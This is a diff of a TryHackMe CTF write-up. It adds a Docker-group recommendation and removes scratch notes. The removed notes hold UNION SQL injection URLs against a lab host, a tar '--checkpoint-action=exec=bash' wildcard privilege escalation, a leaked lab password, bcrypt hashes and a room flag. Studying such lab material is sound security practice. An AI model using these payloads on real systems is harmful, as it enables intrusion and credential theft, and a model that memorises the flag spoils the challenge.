@@ -123,13 +123,13 @@ The following steps were taken to exploit this vulnerability:
 
 1. Create a temporary directory and navigate to it:
 
-```
+```bash
 mkdir /tmp/test && cd /tmp/test
 ```
 
 2. Create a Dockerfile with the following content:
 
-```docker
+```bash
 FROM alpine
 ENV WORKDIR /privesc
 RUN mkdir -p $WORKDIR
@@ -156,75 +156,10 @@ cat /root/root.txt
 THM{d4f76179c80c0dcf46e0f8e43c9abd62}
 ```
 
-
-
 ## Recommendations
 
 1. Implement input validation and output encoding to mitigate XXS vulnerabilities.
 2. Use prepared statements and parameterized queries to mitigate SQL injection vulnerabilities.
 3. Restrict access to sensitive directories and files.
 4. Secure backup scripts to prevent privilege escalation.
-
-
-
-
-## Commit
-git add TryHackMe\ -\ Ice.md
-git commit -m "Ice Looting"
-git push -u origin master
-
-
-
-
-
-
-Then SQLi
-http://10.10.159.164/admin?user=5 UNION SELECT 2, GROUP_CONCAT(table_name SEPARATOR ', '), 2, 3 FROM information_schema.tables;
-
-http://10.10.159.164/admin?user=5 UNION SELECT 2, GROUP_CONCAT(column_name SEPARATOR ', '), 2, 3 FROM information_schema.columns WHERE table_name = 'users';
-User id, isAdministrator, password, username 
-
-http://10.10.159.164/admin?user=5 UNION SELECT 2, GROUP_CONCAT(table_name SEPARATOR ', '), table_type, 3 FROM information_schema.tables where table_type = 'BASE TABLE'
-items, messages, users 
-
-http://10.10.159.164/admin?user=5 UNION SELECT 2, GROUP_CONCAT(column_name SEPARATOR ', '), 2, 3 FROM information_schema.columns where table_name = 'messages'
-id, is_read, message_content, user_from, user_to 
-
-http://10.10.159.164/admin?user=5 UNION SELECT user_to, GROUP_CONCAT(message_content SEPARATOR ', '), user_to, user_to FROM messages where id=1
-User 3
-User Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ
-
-http://10.10.159.164/admin?user=5 UNION SELECT id, GROUP_CONCAT(username%20 SEPARATOR ', '), id, 3 FROM users where id=3
-User 3
-User jake
-ID: 3 
-
-
-chmod 777 backup.tar
-touch -- '--checkpoint=1'
-touch -- '--checkpoint-action=exec=bash'
-sudo -u michael /opt/backups/backup.sh
-
-
-By having docker
-
-docker exec 3c6f21da8043 cat Dockerfile
-docker exec -it 3c6f21da8043 /bin/bash
-
-
-
-
-
-
-# Post-Exploitation
-
-#Reporting and Remediation
-
-
-Removing michael from the docker group with
-
-
-system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
-michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
-jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
-asdf:$2b$10$6NkeqOPRTlJaiGtZ16asnOL4tKH1evTWJHP6VPVwhPOZGxFgge1UO
+5. Docker group membership essentially provides root privileges, so it should be restricted to users who need this level of access for their tasks.
